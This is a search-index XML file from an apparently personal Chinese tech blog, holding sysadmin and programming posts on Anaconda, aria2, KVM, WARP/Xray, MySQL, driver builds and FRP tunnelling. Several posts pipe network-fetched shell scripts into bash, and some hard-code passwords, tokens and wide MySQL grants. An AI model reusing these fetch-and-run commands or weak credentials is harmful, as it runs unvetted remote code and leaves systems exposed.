<?xml version="1.0" encoding="utf-8" standalone="yes"?><search><entry><title>Anaconda的安装和入门</title><url>/posts/python/anaconda%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E5%85%A5%E9%97%A8/</url><categories><category>Python</category></categories><tags><tag>Python</tag><tag>Anaconda</tag></tags><content type="html"><![CDATA[  1.0安装 1.1下载 Anaconda 下载地址：
https://www.anaconda.com/products/individual#download-section 安装方法：无脑下一步就行(**注意：**若想更改安装目录可自行设置)
1.2配置环境变量 1.2.1 将Anaconda 的安装目录和安装目录下的Scripts目录这两个地址添加到 Path 中即可
1.2.2 检查是否配置成功
conda -V 2.0换源 2.1打开终端依次输入下面的内容 conda config --add channels http://mirrors.ustc.edu.cn/anaconda/pkgs/free/ conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ conda config --add channels http://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --set show_channel_urls yes 2.2删除默认源 在用户根目录（C:\Users\用户名）下找到.condarc文件，打开并并编辑，删除其中的default配置行
2.3 初始化powershell 如不初始化powershell，则在powershell中无法激活conda环境 以管理员的方式进入powershell，输入下面的内容
conda init powershell 3.0 基本使用 3.1 更新conda版本 conda update conda 3.2 查看conda帮助信息 conda -h / conda --help 3.3 创建新环境 默认情况下，新创建的环境将会被保存在anconda安装目录下的envs中
conda create --name &lt;env_name&gt; &lt;package_names&gt; &lt;env_name&gt;：新建环境名
&lt;package_names&gt;：新创建的环境中创建的包，多个包使用空格分隔
3.4 列出已有的环境 conda info --env / conda env list 3.5 切换(激活)/取消(不激活)环境 3.5.1 切换环境
conda activate &lt;env_name&gt; 3.5.2 取消环境
conda deactivate &lt;env_name&gt; 3.6 删除环境 conda remove --name &lt;env_name&gt; --all 3.7 复制环境 conda create --name &lt;new_env_name&gt; --clone &lt;copy_env_name&gt; 3.8 导入和导出环境 3.8.1 导出当前环境的包信息，将包信息存入yaml文件中
导出的文件在当前命令执行的所在目录
conda env export &gt; env.yaml 3.8.2 导入yaml文件的环境信息
conda env create -f env.yaml 3.9 包的管理 3.9.1 列出当前环境的包
conda list 3.9.2 查找可安装的包
conda search &lt;package_name&gt; 3.9.3 安装包
当前环境安装
conda install &lt;package_names&gt; 指定环境安装
conda install --name &lt;env_name&gt; &lt;package_names&gt; pip安装（只能在当前环境安装）
pip install &lt;package_names&gt; 3.9.4 卸载包
卸载当前环境的包
conda remove &lt;package_names&gt; 卸载指定环境的包
conda remove --name &lt;env_name&gt; &lt;packages_names&gt; 3.9.5 更新包
更新指定包
conda update &lt;package_name&gt; 更新所有包
conda update --all   ]]></content></entry><entry><title>Axios拦截器配置</title><url>/posts/%E5%89%8D%E7%AB%AF/axios%E6%8B%A6%E6%88%AA%E5%99%A8/</url><categories><category>前端</category></categories><tags><tag>Axios</tag></tags><content type="html"><![CDATA[  import axios from &#34;axios&#34;; import nprogress from &#34;nprogress&#34;; import &#34;nprogress/nprogress.css&#34;; import { Message } from &#34;@arco-design/web-vue&#34;; import { useUserStore } from &#34;@/store/user/index.js&#34;; import router from &#34;@/router/index.js&#34;; const service = axios.create({ //基础路径 baseURL: &#34;/api&#34;, responseType: &#34;json&#34;, headers: { &#39;Content-Type&#39;: &#39;application/json; charset=utf-8&#39; }, //请求不能超过5S timeout: 5000, }); //请求拦截器 service.interceptors.request.use( config =&gt; { // 可以让进度条开始动 nprogress.start(); // 需要携带token带给服务器 const userStore = useUserStore() if(userStore.token){ config.headers.token = userStore.token; } return config; }, error =&gt; { // 请求失败提示 Message.error({content: error}) return Promise.reject(error) }); // 响应拦截器 service.interceptors.response.use( response =&gt; { //进度条结束 nprogress.done(); // 如果返回的状态码为200，说明接口请求成功，可以正常拿到数据 // 否则的话抛出错误 if (response.status === 200) { return Promise.resolve(response.data); } else { return Promise.reject(response); } }, error =&gt; { const userStore = useUserStore() if (error.response.status) { switch (error.response.status) { case 401: Message.error({content: error.response.data.message}) localStorage.removeItem(&#34;token&#34;) userStore.token = &#39;&#39; router.replace(&#34;/login&#34;) break case 403: Message.error({content: error.response.data.message}) break case 404: Message.error({content: &#39;请求的资源不存在!&#39;}) break default: Message.error({content: &#39;错误的请求&#39;}) } } return Promise.reject(error.response) }); export default service; import request from &#34;@/request&#34;; export function login(loginInfo) { return request({ url: &#39;/login&#39;, method: &#39;post&#39;, data: loginInfo }) }   ]]></content></entry><entry><title>BT下载服务搭建</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/bt%E4%B8%8B%E8%BD%BD%E6%9C%8D%E5%8A%A1%E6%90%AD%E5%BB%BA/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag></tags><content type="html"><![CDATA[  github项目地址： https://github.com/P3TERX/aria2.sh 0. 新加入Docker安装 文档地址： https://p3terx.com/archives/docker-aria2-pro.html 0.1 安装aria2 自行替换RPC_SECRET后启动
docker run -d \ --name aria2-pro \ --restart always \ --log-opt max-size=1m \ --network host \ -e PUID=$UID \ -e PGID=$GID \ -e RPC_SECRET=czyadmin \ -e RPC_PORT=6800 \ -e LISTEN_PORT=6888 \ -v $PWD/aria2-config:/config \ -v $PWD/aria2-downloads:/downloads \ p3terx/aria2-pro 0.2 安装WEBUI docker run -d \ --name ariang \ --restart always \ --log-opt max-size=1m \ -p 6880:6880 \ p3terx/ariang 0.3 安装filebrowser 默认用户名和密码：admin
docker run -d \ --name filebrowser \ --restart always \ -v $PWD/aria2-downloads:/srv \ -v $PWD/filebrowser/filebrowser.db:/database/filebrowser.db \ -v $PWD/filebrowser/settings.json:/config/settings.json \ -e PUID=$(id -u) \ -e PGID=$(id -g) \ -p 8080:80 \ filebrowser/filebrowser 普通安装 1.0 安装并配置aria2 wget https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/aria2.sh -O /root/aria2.sh &amp;&amp; bash /root/aria2.sh 2.0 设置tracker自动更新 wget https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/tracker.sh -O /root/tracker.sh &amp;&amp; bash /root/tracker.sh crontab -e # 每周日凌晨5点 0 5 * * 0 /bin/bash /root/tracker.sh 2&gt;&amp;1 3.0 安装AriaNg wget https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/AriaNg-1.2.3-AllInOne.zip -O /root/AriaNg.zip apt install nginx -y unzip /root/AriaNg.zip -d /var/www/AriaNg vim /etc/nginx/sites-enabled/AriaNg server { listen 80; #监听端口 server_name 127.0.0.1; #主机ip index index.html index.htm; location / { root /var/www/AriaNg; #站点目录 } } # 检查语法错误 nginx -t # 重启服务 systemctl restart nginx.service 填入RPC密钥 4.0 安装filebrowser wget https://picture-czy.oss-cn-beijing.aliyuncs.com/shareFile/linux-amd64-filebrowser.tar.gz tar -zxvf linux-amd64-filebrowser.tar.gz -C /usr/local/bin/ #先创建一个目录用来存放数据库和配置文件 mkdir /etc/filebrowser/ source ~/.bashrc ############# 国外新方法 ################## curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash #创建配置数据库 filebrowser -d /etc/filebrowser/filebrowser.db config init #设置监听地址 filebrowser -d /etc/filebrowser/filebrowser.db config set --address 0.0.0.0 #设置监听端口 filebrowser -d /etc/filebrowser/filebrowser.db config set --port 8080 #设置语言环境 filebrowser -d /etc/filebrowser/filebrowser.db config set --locale zh-cn #设置日志位置 filebrowser -d /etc/filebrowser/filebrowser.db config set --log /var/log/filebrowser.log #添加一个用户 filebrowser -d /etc/filebrowser/filebrowser.db users add admin password --perm.admin #设置网盘根目录 filebrowser -d /etc/filebrowser/filebrowser.db config set --root /mnt/hhd01/aria2 # 启动 filebrowser -d /etc/filebrowser/filebrowser.db Username: admin Password: password 后台挂起 nohup filebrowser -d /etc/filebrowser/filebrowser.db &amp; 或者设置守护进程
vim /lib/systemd/system/filebrowser.service [Unit] Description=File Browser After=network.target [Service] Type=simple ExecStart=/usr/local/bin/filebrowser -d /etc/filebrowser/filebrowser.db Restart=on-abnormal RestartSec=5s KillMode=mixed [Install] WantedBy=multi-user.target systemctl daemon-reload systemctl start filebrowser.service systemctl status filebrowser.service systemctl enable filebrowser.service   ]]></content></entry><entry><title>byobu的使用</title><url>/posts/linux%E6%93%8D%E4%BD%9C/byobu%E7%9A%84%E4%BD%BF%E7%94%A8/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> 1.1 安装 sudo apt-get install byobu 命令安装byobu
1.2 登录启动 byobu-enable 表示Byobu窗口管理器将在每次文本登录时自动启动
byobu-disable 表示Byobu窗口管理器将不再在登录时自动启动
1.3 色彩提示 byobu-enable-prompt 启动Byobu的彩色提示
byobu-disable-prompt 禁用Byobu的彩色提示
2.Byobu 使用 更多相关操作可以按 F9 选项查看帮助指南 2.1 使用会话 一个会话仅仅是byobu的运行实例。会话由一组窗口组成，这些窗口基本上是shell会话，默认开启byobu只开0这一个窗口
(1) 创建窗口 F2 创建新的窗口
(2) 切换窗口 F3 回到先前窗口
F4 跳到下一个窗口
(3) 重命名窗口 F8 重新命名一个窗口
(4) 窗口操作 F5 重新加载文件
F6 释放该次对话
F7 进入 复制/回滚模式
F9 配置菜单
Ctrl + D关闭当前窗口
2.2 使用窗格 Byobu提供了将窗口分成多个窗格的功能，包括水平和垂直分割。这些允许您在同一窗口中进行多任务，而不是跨多个窗口。
(1) 创建窗格 SHIFT + F2 创建一个水平窗格
CTRL + F2 创造一个垂直窗格
(2) 切换窗格 以下三个快捷键都可以让窗格切换:
SHIFT + LEFT/RIGHT/UP/DOWN
SHIFT + F3/F4
CTRL + F3/F4
(3) 设置窗格 SHIFT + ALT + LEFT/RIGHT/UP/DOWN 调整当前窗格的大小
SHIFT + F11 切换窗格以暂时填充整个窗口
ALT + F11 永久地将窗格拆分为自己的新窗口
2.3 配置通知栏 ①.按F9进入Byobu配置菜单。
②.导航到 切换状态通知选项，然后按 ENTER
③.选择要启用或禁用的状态通知。(启用状态通知后，它们将显示在底部状态栏中，与窗口指示器一起显示。)
④.选择要启用的状态通知后，选择 应用，按 F5 才能刷新状态栏
有很多不同的通知可供选择，一些常用的通知是：
date 显示当前系统日期。
disk 显示当前磁盘空间使用情况。
hostname 显示当前系统主机名。
ip_address 显示当前系统的IP地址。
load_average 显示当前系统负载平均值。
memory 显示当前的内存使用情况。
network 显示当前的网络使用情况，发送和接收。
reboot_required 显示需要重新启动系统时的指示灯。
release 显示当前的分发版本（例如14.04）。
time 显示当前系统时间。
updates_available 在有可用更新时显示指示符。
uptime 显示当前系统正常运行时间。
whoami 显示当前登录的用户。</content></entry><entry><title>Centos8 KVM 虚拟化</title><url>/posts/kvm%E8%99%9A%E6%8B%9F%E5%8C%96/centos8-kvm-%E8%99%9A%E6%8B%9F%E5%8C%96/</url><categories><category>KVM</category></categories><tags><tag>KVM</tag><tag>Linux</tag></tags><content type="html"><![CDATA[  1. 安装Centos8 1.1 下载 Centos8 镜像 下载地址： http://isoredirect.centos.org/centos/8/isos/x86_64/ 1.2 安装Centos8 1.2.1 回车
1.2.2 选择中文
1.2.3 从右到左依次点击配置，先选择安装目的地
1.2.4 配置网络
这时要等待镜像源的选择，不要认为卡了
1.2.5 来到软件选择，选择安装虚拟化主机
1.2.6 设置root密码
1.2.7 点击开始安装，并等待15分钟左右
2. 在 Centos8 上安装KVM 2.1 先检查硬件是否支持虚拟化 grep -e &#39;vmx&#39; /proc/cpuinfo #Intel CPU grep -e &#39;svm&#39; /proc/cpuinfo #AMD CPU 出现标有红色字样的字，则代表支持
2.2 确认KVM模块是否已加载到内核中 lsmod | grep kvm 2.3 安装cockpit Web控制台 cockpit是预先安装的，并在新安装的CentOS 8和RHEL 8系统上启用。 如果您没有安装它，使用下面的dnf命令进行安装。其中cockpit-machines扩展是用来管理基于Libvirt的虚拟机的
使用阿里云镜像，速度更快
$ mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup $ wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-8.repo $ yum makecache $ dnf install cockpit cockpit-machines 启动cockpit socket服务
$ systemctl start cockpit.socket $ systemctl enable cockpit.socket $ systemctl status cockpit.socket 配置防火墙
$ firewall-cmd --add-service=cockpit --permanent $ firewall-cmd --reload 2.4 打开控制台 使用浏览器打开 https://服务器IP:9090/
用户名和密码和系统的一样
2.5 添加网桥 2.5.1 点击左侧控制面板中 -网络-
2.5.2 点击 -添加网桥- 选择第一个网卡后点击应用
2.6 添加虚拟机 2.6.1 点击左侧控制面板中的 -虚拟机-
2.6.2 点击 -创建虚拟机-
win7镜像我已经上传到/opt/目录下，也可以选择下载一个OS，但需要时间等待
2.6.3 点击创建好的虚拟机，编辑详细信息
这里我编辑了CPU的数量，自行发挥，之后点击安装
2.7 开启win7远程桌面 点击选择用户可以查看和添加远程连接的用户
  ]]></content></entry><entry><title>Cloudflare WARP解锁NetFlix</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/cloudflare-warp%E8%A7%A3%E9%94%81netflix/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag></tags><content type="html"><![CDATA[  1. 检测是否解锁 #项目地址：https://github.com/sjlleo/netflix-verify #下载检测解锁程序 wget -O nf https://github.com/sjlleo/netflix-verify/releases/download/v3.1.0/nf_linux_amd64 &amp;&amp; chmod +x nf #执行 ./nf #通过代理执行 ./nf -proxy socks5://127.0.0.1:40000 2. WARP安装 github地址： https://github.com/P3TERX/warp.sh 使用文档地址： https://p3terx.com/archives/cloudflare-warp-configuration-script.html 使用以下命令一把梭后将自动安装 WARP 官方客户端并开启 SOCKS5 代理端口 (127.0.0.1:40000)：
# 自动配置 WARP 官方客户端 SOCKS5 代理 bash &lt;(curl -fsSL git.io/warp.sh) s5 执行以下命令显示功能菜单和贴心的状态显示：
# Cloudflare WARP 一键配置脚本 功能菜单 bash &lt;(curl -fsSL git.io/warp.sh) menu 3. 通过WARP代理再次检测是否解锁 ./nf -proxy socks5://127.0.0.1:40000 #查询代理后的IP地址： curl ifconfig.me --proxy socks5://127.0.0.1:40000 4. 配置Xray分流 替换掉文本域中的内容后，重启面板 { &#34;api&#34;: { &#34;services&#34;: [ &#34;HandlerService&#34;, &#34;LoggerService&#34;, &#34;StatsService&#34; ], &#34;tag&#34;: &#34;api&#34; }, &#34;inbounds&#34;: [ { &#34;listen&#34;: &#34;127.0.0.1&#34;, &#34;port&#34;: 62789, &#34;protocol&#34;: &#34;dokodemo-door&#34;, &#34;settings&#34;: { &#34;address&#34;: &#34;127.0.0.1&#34; }, &#34;tag&#34;: &#34;api&#34; } ], &#34;outbounds&#34;: [ { &#34;protocol&#34;: &#34;freedom&#34;, &#34;settings&#34;: {} }, { &#34;tag&#34;: &#34;netflix_proxy&#34;, &#34;protocol&#34;: &#34;socks&#34;, &#34;settings&#34;: { &#34;servers&#34;: [ { &#34;address&#34;: &#34;127.0.0.1&#34;, &#34;port&#34;: 40000 } ] } }, { &#34;protocol&#34;: &#34;blackhole&#34;, &#34;settings&#34;: {}, &#34;tag&#34;: &#34;blocked&#34; } ], &#34;policy&#34;: { &#34;system&#34;: { &#34;statsInboundDownlink&#34;: true, &#34;statsInboundUplink&#34;: true } }, &#34;routing&#34;: { &#34;rules&#34;: [ { &#34;type&#34;: &#34;field&#34;, &#34;outboundTag&#34;: &#34;netflix_proxy&#34;, &#34;domain&#34;: [ &#34;geosite:netflix&#34;, &#34;geosite:disney&#34;, &#34;geosite:category-porn&#34; ] }, { &#34;inboundTag&#34;: [ &#34;api&#34; ], &#34;outboundTag&#34;: &#34;api&#34;, &#34;type&#34;: &#34;field&#34; }, { &#34;ip&#34;: [ &#34;geoip:private&#34; ], &#34;outboundTag&#34;: &#34;blocked&#34;, &#34;type&#34;: &#34;field&#34; }, { &#34;outboundTag&#34;: &#34;blocked&#34;, &#34;protocol&#34;: [ &#34;bittorrent&#34; ], &#34;type&#34;: &#34;field&#34; } ] }, &#34;stats&#34;: {} } 重启面板后不通过代理再次检测
./nf 原来的xray配置
{ &#34;api&#34;: { &#34;services&#34;: [ &#34;HandlerService&#34;, &#34;LoggerService&#34;, &#34;StatsService&#34; ], &#34;tag&#34;: &#34;api&#34; }, &#34;inbounds&#34;: [ { &#34;listen&#34;: &#34;127.0.0.1&#34;, &#34;port&#34;: 62789, &#34;protocol&#34;: &#34;dokodemo-door&#34;, &#34;settings&#34;: { &#34;address&#34;: &#34;127.0.0.1&#34; }, &#34;tag&#34;: &#34;api&#34; } ], &#34;outbounds&#34;: [ { &#34;protocol&#34;: &#34;freedom&#34;, &#34;settings&#34;: {} }, { &#34;protocol&#34;: &#34;blackhole&#34;, &#34;settings&#34;: {}, &#34;tag&#34;: &#34;blocked&#34; } ], &#34;policy&#34;: { &#34;system&#34;: { &#34;statsInboundDownlink&#34;: true, &#34;statsInboundUplink&#34;: true } }, &#34;routing&#34;: { &#34;rules&#34;: [ { &#34;inboundTag&#34;: [ &#34;api&#34; ], &#34;outboundTag&#34;: &#34;api&#34;, &#34;type&#34;: &#34;field&#34; }, { &#34;ip&#34;: [ &#34;geoip:private&#34; ], &#34;outboundTag&#34;: &#34;blocked&#34;, &#34;type&#34;: &#34;field&#34; }, { &#34;outboundTag&#34;: &#34;blocked&#34;, &#34;protocol&#34;: [ &#34;bittorrent&#34; ], &#34;type&#34;: &#34;field&#34; } ] }, &#34;stats&#34;: {} }   ]]></content></entry><entry><title>CSS高度塌陷</title><url>/posts/%E5%89%8D%E7%AB%AF/css%E9%AB%98%E5%BA%A6%E5%A1%8C%E9%99%B7/</url><categories><category>前端</category></categories><tags><tag>CSS</tag></tags><content type="html"> CSS高度塌陷 .clearfix::before, .clearfix::after { content: &amp;#39;&amp;#39;; display: table; clear: both; }</content></entry><entry><title>Debian Locale问题</title><url>/posts/linux%E6%93%8D%E4%BD%9C/debian-locale%E9%97%AE%E9%A2%98/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>疑难杂症</tag></tags><content type="html"> Debian locale问题 问题 root@debian:~# locale -a locale: Cannot set LC_CTYPE to default locale: No such file or directory locale: Cannot set LC_MESSAGES to default locale: No such file or directory locale: Cannot set LC_COLLATE to default locale: No such file or directory C C.UTF-8 POSIX zh_CN.utf8 -bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8) 解决办法 sudo localedef -i en_US -f UTF-8 en_US.UTF-8</content></entry><entry><title>Debian安装MySQL</title><url>/posts/mysql/debian-%E5%AE%89%E8%A3%85-mysql/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"><![CDATA[  1. 将 MySQL APT 存储库添加到系统 wget http://repo.mysql.com/mysql-apt-config_0.8.13-1_all.deb sudo dpkg -i mysql-apt-config_0.8.13-1_all.deb # 或者 apt-get install ./mysql-apt-config_0.8.13-1_all.deb 选择第一个，按 Tabel 键到确定进行版本的选择，这里选择了5.7，之后来到OK选择，按Table键确定后退出
2. 更新软件包，并安装MySql sudo apt-get update sudo apt install mysql-server 3. 安装过程中会要求输入root密码 4. 创建用户并授权 use mysql create user &#39;colzry&#39;@&#39;%&#39; identified by &#39;colzry_admin&#39;; grant all on *.* to &#39;colzry&#39;@&#39;%&#39;; flush privileges; 5. 将本地登录改为可远程登录 use mysql; // 其中user_name为要更改的用户名 update user set host=&#39;%&#39; where user = &#39;user_name&#39;; // 刷新权限 flush privileges; 5.1还需修改配置文件
vim /etc/mysql/mysql.conf.d/mysqld.cnf 6. 更改密码 // 法一 // user_name为要更改的用户名 new_passwd为要更改的密码 set password for user_name@localhost = password(&#39;new_passwd&#39;); // 法二 // name为要更改的用户名 new_passwd为要更改的密码 set password=password(&#39;new_passwd&#39;); grant all on *.* to &#39;user_name&#39;@&#39;%&#39; identified by &#39;new_passwd&#39;; flush privileges; 7. 卸载 apt-get remove --purge &#39;mysql-.*&#39; apt-get remove --purge &#39;mysql-server.*&#39;   ]]></content></entry><entry><title>Debian编译网卡驱动(I219-V)</title><url>/posts/linux%E6%93%8D%E4%BD%9C/debian%E7%BC%96%E8%AF%91%E7%BD%91%E5%8D%A1%E9%A9%B1%E5%8A%A8i219-v/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>疑难杂症</tag></tags><content type="html"> 换源 bash &amp;lt;(curl -sSL https://gitee.com/SuperManito/LinuxMirrors/raw/main/ChangeMirrors.sh) 1. 下载网卡驱动 下载e1000e网卡驱动，下载地址 https://downloadcenter.intel.com/zh-cn/download/15817?_ga=1.159975677.114505945.1484457019 2. 配置编译环境 # 查看内核版本 uname -r # 去华农镜像下载对应的linux-headers curl -O https://mirrors.scau.edu.cn/proxmox/debian/dists/bullseye/pve-no-subscription/binary-amd64/pve-headers-5.15.30-2-pve_5.15.30-3_amd64.deb # 安装linux-headers dpkg -i pve-headers-5.15.30-2-pve_5.15.30-3_amd64.deb # 安装编译工具链 sudo apt install build-essential build-essential 包含了以下编译环境
$ apt-cache depends build-essential build-essential |Depends: libc6-dev Depends: &amp;lt;libc-dev&amp;gt; libc6-dev Depends: gcc Depends: g++ Depends: make make-guile Depends: dpkg-de RedHat 安装 yum install make automake gcc gcc-c++ kernel-devel 3. 开始编译 cd e1000e-3.8.5/src make install 若编译报错
common.mk:82: *** Kernel header files not in any of the expected locations. common.mk:83: *** Install the appropriate kernel development package, e.g. common.mk:84: *** kernel-devel, for building kernel modules and try again. Stop. 安装内核源码
sudo apt-get install linux-headers-$(uname -r) 若上面的安装失败，安装通用内核替代
sudo apt-get install linux-headers-generic 创建软连接
ln -s /usr/src/linux-headers-5.4.0-65-generic /usr/src/linux</content></entry><entry><title>DFS和BFS题型</title><url>/posts/%E7%AE%97%E6%B3%95/dfs%E5%92%8Cbfs%E7%9A%84%E9%A2%98%E5%9E%8B/</url><categories><category>算法</category></categories><tags><tag>算法</tag></tags><content type="html"><![CDATA[  剪格子 题目描述
问题描述 如下图所示，3 x 3 的格子中填写了一些整数。 +&amp;ndash;&amp;ndash;+&amp;ndash;+ |10 1|52| +&amp;mdash;-+ |20|30* 1| ***&amp;ndash;+ | 1| 2| 3| +&amp;ndash;+&amp;ndash;+&amp;ndash;+ 我们沿着图中的星号线剪开，得到两个部分，每个部分的数字和都是60。 本题的要求就是请你编程判定：对给定的m x n 的格子中的整数，是否可以分割为两个部分，使得这两个区域的数字和相等。 如果存在多种解答，请输出包含左上角格子的那个区域包含的格子的最小数目。 如果无法分割，则输出 0。
输入
程序先读入两个整数 m n 用空格分割 (m,n&amp;lt; 10)。 表示表格的宽度和高度。 接下来是n行，每行m个正整数，用空格分开。每个整数不大于10000。
输出
输出一个整数，表示在所有解中，包含左上角的分割区可能包含的最小的格子数目。
样例输入
3 3 10 1 52 20 30 1 1 2 3 样例输出
3 public class 剪格子 { private static int[][] lattice; // 格子 private static boolean[][] isvisited; // 是否被访问 private static final int[][] direction = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}}; // 行走的策略，按顺时针 private static int sum = 0; private static int count = 100; // 最小格子数，先定义100表示最大 public static void main(String[] args) { try(Scanner sc = new Scanner(System.in)) { int m = sc.nextInt(); int n = sc.nextInt(); lattice = new int[n][m]; isvisited = new boolean[n][m]; for (int i = 0; i &amp;lt; n; i++) for (int j = 0; j &amp;lt; m; j++) { lattice[i][j] = …  ]]></content></entry><entry><title>DNS服务列表</title><url>/posts/%E5%85%B6%E4%BB%96/dns%E6%9C%8D%E5%8A%A1%E5%88%97%E8%A1%A8/</url><categories><category>Other</category></categories><tags><tag>DNS</tag></tags><content type="html"> 阿里：
IPv4 DNS 地址: 223.5.5.5 223.6.6.6 IPv6 DNS 地址： 2400:3200::1 2400:3200:baba::1 腾讯：
119.29.29.29 119.28.28.28 114:
114.114.114.114 114.114.115.115 Linux 配置DNS
sudo vim /etc/resolv.conf nameserver 223.6.6.6 Linux 换源 bash &amp;lt;(curl -sSL https://gitee.com/SuperManito/LinuxMirrors/raw/main/ChangeMirrors.sh)</content></entry><entry><title>entity、bo、vo、po、dto、pojo如何理解和区分</title><url>/posts/java/entitybovopodtopojo%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3%E5%92%8C%E5%8C%BA%E5%88%86/</url><categories><category>Java</category></categories><tags><tag>Java</tag></tags><content type="html"> Entity 最常用实体类，基本和数据表一一对应，一个实体一张表。
Bo(business object) 代表业务对象的意思，Bo就是把业务逻辑封装为一个对象（注意是逻辑，业务逻辑），这个对象可以包括一个或多个其它的对象。通过调用Dao方法，结合Po或Vo进行业务操作。
形象描述为一个对象的形为和动作，当然也有涉及到基它对象的一些形为和动作。比如处理一个人的业务逻辑，该人会睡觉，吃饭，工作，上班等等行为，还有可能和别人发关系的行为，处理这样的业务逻辑时，我们就可以针对BO去处理。
再比如投保人是一个Po，被保险人是一个Po，险种信息也是一个Po等等，他们组合起来就是一张保单的Bo。
Vo(value object) 代表值对象的意思，通常用于业务层之间的数据传递，由new创建，由GC回收。
主要体现在视图的对象，对于一个WEB页面将整个页面的属性封装成一个对象，然后用一个VO对象在控制层与视图层进行传输交换。
Po(persistant object) 代表持久层对象的意思，对应数据库中表的字段，数据库表中的记录在java对象中的显示状态，最形象的理解就是一个PO就是数据库中的一条记录。
好处是可以把一条记录作为一个对象处理，可以方便的转为其它对象。Vo和Po，都是属性加上属性的get和set方法；表面看没什么不同，但代表的含义是完全不同的。
Dto(data transfer object) 代表数据传输对象的意思
是一种设计模式之间传输数据的软件应用系统，数据传输目标往往是数据访问对象从数据库中检索数据
数据传输对象与数据交互对象或数据访问对象之间的差异是一个以不具任何行为除了存储和检索的数据（访问和存取器）
简而言之，就是接口之间传递的数据封装
表里面有十几个字段：id，name，gender（M/F)，age……
页面需要展示三个字段：name，gender(男/女)，age
DTO由此产生，一是能提高数据传输的速度(减少了传输字段)，二能隐藏后端表结构
Pojo(plian ordinary java object) 代表简单无规则java对象
纯的传统意义的java对象，最基本的Java Bean只有属性加上属性的get和set方法
可以额转化为PO、DTO、VO；比如POJO在传输过程中就是DTO
Dao(data access object) 代表 …</content></entry><entry><title>ES6箭头函数this指向详解</title><url>/posts/%E5%89%8D%E7%AB%AF/es6%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0%E7%9A%84this%E6%8C%87%E5%90%91%E8%AF%A6%E8%A7%A3/</url><categories><category>前端</category></categories><tags><tag>ES6</tag></tags><content type="html"><![CDATA[  箭头函数体内的this对象，就是定义该函数时所在的作用域指向的对象，而不是使用时所在的作用域指向的对象。
举例
var name = &#39;window&#39;; // 其实是window.name = &#39;window&#39; var A = { name: &#39;A&#39;, sayHello: function(){ console.log(this.name) } } A.sayHello();// 输出A var B = { name: &#39;B&#39; } A.sayHello.call(B);//输出B A.sayHello.call();//不传参数指向全局window对象，输出window.name也就是window var name = &#39;window&#39;; var A = { name: &#39;A&#39;, sayHello: () =&gt; { console.log(this.name) } } A.sayHello();// 还是以为输出A ? 错啦，其实输出的是window var name = &#39;window&#39;; var A = { name: &#39;A&#39;, sayHello: function(){ var s = () =&gt; console.log(this.name) // 存在函数上下文 return s//返回箭头函数s } } var sayHello = A.sayHello(); sayHello();// 输出A var B = { name: &#39;B&#39;; } sayHello.call(B); //还是A sayHello.call(); //还是A   ]]></content></entry><entry><title>Frpc配置文件生成脚本</title><url>/posts/ssh/frpc%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%94%9F%E6%88%90%E8%84%9A%E6%9C%AC/</url><categories><category>SSH</category></categories><tags><tag>FRP</tag></tags><content type="html"><![CDATA[  #!/bin/bash #================================================================ # Copyright (C) 2022 IEucd Inc. All rights reserved. # # FileName：rand.sh # Author：Colzry, colzry@163.com # CreateDate：2022-10-28 # Description： # #================================================================ read -p &#34;请输入要穿透的端口: &#34; target_port function mimvp_app_port() { min=$1 max=$2 mid=$(($max-$min+1)) num=$(head -n 20 /dev/urandom | cksum | cut -f1 -d &#39; &#39;) randnum=$(($num%$mid+$min)) # 排除的端口号 20000,30000,40000,50000, 可以任意添加 port_exclude=&#39;10001,20000,30000,40000,50000&#39; flag=`echo ${port_exclude} | grep ${randnum} | wc -l` while [ &#34;$flag&#34; -eq &#34;1&#34; ] do num=$(head -n 20 /dev/urandom | cksum | cut -f1 -d &#39; &#39;) randnum=$(($num%$mid+$min)) flag=`echo ${port_exclude} | grep ${randnum} | wc -l` done echo $randnum } # 生成随机端口 rand_port=$(mimvp_app_port 10001 50000) # 生成随机隧道名 rand_name=`echo $RANDOM | md5sum | cut -c11-20` cat &lt;&lt; EOF [common] server_addr = frp.104300.xyz server_port = 7000 tcp_mux = true protocol = tcp token = www.126126.xyz dns_server = 223.5.5.5 [$rand_name] type = tcp local_ip = 127.0.0.1 local_port = $target_port remote_port = $rand_port EOF   ]]></content></entry><entry><title>FRP内网穿透</title><url>/posts/linux%E6%9C%8D%E5%8A%A1/frpc%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>服务搭建</tag><tag>FRP</tag></tags><content type="html"> 1. 下载Frp wget https://gitpy.colzry.tk/github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz wget https://github.com/fatedier/frp/releases/download/v0.48.0/frp_0.48.0_linux_amd64.tar.gz 2. 服务端安装 2.1 解压文件 tar -zxvf frp_0.48.0_linux_amd64.tar.gz cd frp_0.48.0_linux_amd64/ cp frps /usr/local/bin/ 2.2 编写配置文件 mkdir /etc/frps vim /etc/frps/frps.ini [common] bind_port = 7000 token = czyadmin 2.3 启动 sudo vim /lib/systemd/system/frps.service [Unit] Description=Frp Server Service After=network.target [Service] Type=simple User=nobody Restart=on-failure RestartSec=5s ExecStart=/usr/local/bin/frps -c /etc/frps/frps.ini 